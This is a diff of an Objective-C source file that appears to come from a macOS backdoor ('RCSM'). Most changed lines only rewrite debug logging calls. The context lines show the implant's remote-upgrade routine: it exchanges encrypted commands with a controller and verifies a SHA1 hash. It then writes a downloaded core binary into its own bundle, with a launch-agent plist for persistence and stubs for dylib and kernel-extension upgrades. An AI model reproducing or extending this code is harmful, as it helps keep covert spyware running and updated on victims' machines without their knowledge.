@@ -15,9 +15,8 @@
 #import "NSData+Pascal.h"
 #import "RCSMCommon.h"
 
-#import "RCSMFileSystemManager.h"
-
-//#define DEBUG_UPGRADE_NOP
+#import "RCSMLogger.h"
+#import "RCSMDebug.h"
 
 
 @interface UpgradeNetworkOperation (private)
@@ -53,7 +52,7 @@
   if (success == NO)
     {
 #ifdef DEBUG
-      errorLog(ME, @"Error while changing attributes on the upgrade file");
+      errorLog(@"Error while changing attributes on the upgrade file");
 #endif
       return success;
     }
@@ -90,7 +89,7 @@
   if (success == NO)
     {
 #ifdef DEBUG_UPGRADE_NOP
-      errorLog(ME, @"Error while writing backdoor launchAgent plist");
+      errorLog(@"Error while writing backdoor launchAgent plist");
 #endif
       return success;
     }
@@ -110,7 +109,7 @@
       mTransport = aTransport;
       
 #ifdef DEBUG_UPGRADE_NOP
-      infoLog(ME, @"mTransport: %@", mTransport);
+      infoLog(@"mTransport: %@", mTransport);
 #endif
       return self;
     }
@@ -126,7 +125,7 @@
 - (BOOL)perform
 {
 #ifdef DEBUG_UPGRADE_NOP
-  infoLog(ME, @"");
+  infoLog(@"");
 #endif
   
   uint32_t command              = PROTO_UPGRADE;
@@ -138,7 +137,7 @@
   [commandData appendData: commandSha];
   
 #ifdef DEBUG_UPGRADE_NOP
-  infoLog(ME, @"commandData: %@", commandData);
+  infoLog(@"commandData: %@", commandData);
 #endif
   
   [commandData encryptWithKey: gSessionKey];
@@ -157,7 +156,7 @@
   [replyDecrypted decryptWithKey: gSessionKey];
   
 #ifdef DEBUG_UPGRADE_NOP
-  infoLog(ME, @"replyDecrypted: %@", replyDecrypted);
+  infoLog(@"replyDecrypted: %@", replyDecrypted);
 #endif
   
   [replyDecrypted getBytes: &command
@@ -184,7 +183,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_UPGRADE_NOP
-      errorLog(ME, @"exception on sha makerange (%@)", [e reason]);
+      errorLog(@"exception on sha makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -197,14 +196,14 @@
   shaLocal = [shaLocal sha1Hash];
   
 #ifdef DEBUG_UPGRADE_NOP
-  infoLog(ME, @"shaRemote: %@", shaRemote);
-  infoLog(ME, @"shaLocal : %@", shaLocal);
+  infoLog(@"shaRemote: %@", shaRemote);
+  infoLog(@"shaLocal : %@", shaLocal);
 #endif
   
   if ([shaRemote isEqualToData: shaLocal] == NO)
     {
 #ifdef DEBUG_UPGRADE_NOP
-      errorLog(ME, @"sha mismatch");
+      errorLog(@"sha mismatch");
 #endif
       
       [replyDecrypted release];
@@ -217,7 +216,7 @@
   if (command != PROTO_OK)
     {
 #ifdef DEBUG_UPGRADE_NOP
-      errorLog(ME, @"No upload request available (command %d)", command);
+      errorLog(@"No upload request available (command %d)", command);
 #endif
       
       [replyDecrypted release];
@@ -246,7 +245,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_UPGRADE_NOP
-      errorLog(ME, @"exception on parameters makerange (%@)", [e reason]);
+      errorLog(@"exception on parameters makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -257,10 +256,10 @@
     }
   
 #ifdef DEBUG_UPGRADE_NOP
-  infoLog(ME, @"packetSize    : %d", packetSize);
-  infoLog(ME, @"numOfFilesLeft: %d", numOfFilesLeft);
-  infoLog(ME, @"filenameSize  : %d", filenameSize);
-  infoLog(ME, @"fileSize      : %d", fileSize);
+  infoLog(@"packetSize    : %d", packetSize);
+  infoLog(@"numOfFilesLeft: %d", numOfFilesLeft);
+  infoLog(@"filenameSize  : %d", filenameSize);
+  infoLog(@"fileSize      : %d", fileSize);
 #endif
   
   NSData *stringData;
@@ -276,7 +275,7 @@
   @catch (NSException *e)
     {
 #ifdef DEBUG_UPGRADE_NOP
-      errorLog(ME, @"exception on stringData makerange (%@)", [e reason]);
+      errorLog(@"exception on stringData makerange (%@)", [e reason]);
 #endif
       
       [replyDecrypted release];
@@ -291,27 +290,27 @@
   if (filename == nil)
     {
 #ifdef DEBUG_UPGRADE_NOP
-      errorLog(ME, @"filename is empty, error on unpascalize");
+      errorLog(@"filename is empty, error on unpascalize");
 #endif
     }
   else
     {
 #ifdef DEBUG_UPGRADE_NOP
-      infoLog(ME, @"filename: %@", filename);
-      infoLog(ME, @"file content: %@", fileContent);
+      infoLog(@"filename: %@", filename);
+      infoLog(@"file content: %@", fileContent);
 #endif
     
       if ([filename isEqualToString: CORE_UPGRADE])
         {
 #ifdef DEBUG_UPGRADE_NOP
-          infoLog(ME, @"Received a core upgrade");
+          infoLog(@"Received a core upgrade");
 #endif
           NSString *_upgradePath = [[NSString alloc] initWithFormat: @"%@/%@",
                                     [[NSBundle mainBundle] bundlePath],
                                     gBackdoorUpdateName];
           
 #ifdef DEBUG_UPGRADE_NOP
-          infoLog(ME, @"Writing core upgrade @ %@", _upgradePath);
+          infoLog(@"Writing core upgrade @ %@", _upgradePath);
 #endif
           [fileContent writeToFile: _upgradePath
                         atomically: YES];
@@ -319,7 +318,7 @@
           if ([self _updateFilesForCoreUpgrade: _upgradePath] == NO)
             {
 #ifdef DEBUG_UPGRADE_NOP
-              errorLog(ME, @"Error while updating files for core upgrade");
+              errorLog(@"Error while updating files for core upgrade");
 #endif
             }
           
@@ -328,7 +327,7 @@
       else if ([filename isEqualToString: DYLIB_UPGRADE])
         {
 #ifdef DEBUG_UPGRADE_NOP
-          infoLog(ME, @"Received a dylib upgrade, not yet implemented");
+          infoLog(@"Received a dylib upgrade, not yet implemented");
 #endif
           
           // TODO: Check OS Version and upgrade either OSAX or Input Manager
@@ -336,7 +335,7 @@
       else if ([filename isEqualToString: KEXT_UPGRADE])
         {
 #ifdef DEBUG_UPGRADE_NOP
-          infoLog(ME, @"Received a kext upgrade, not yet implemented");
+          infoLog(@"Received a kext upgrade, not yet implemented");
 #endif
           
           // TODO: Update kext binary inside Resources subfolder
@@ -344,7 +343,7 @@
       else
         {
 #ifdef DEBUG_UPGRADE_NOP
-          errorLog(ME, @"Upgrade not supported (%@)", filename);
+          errorLog(@"Upgrade not supported (%@)", filename);
 #endif
         }
     }
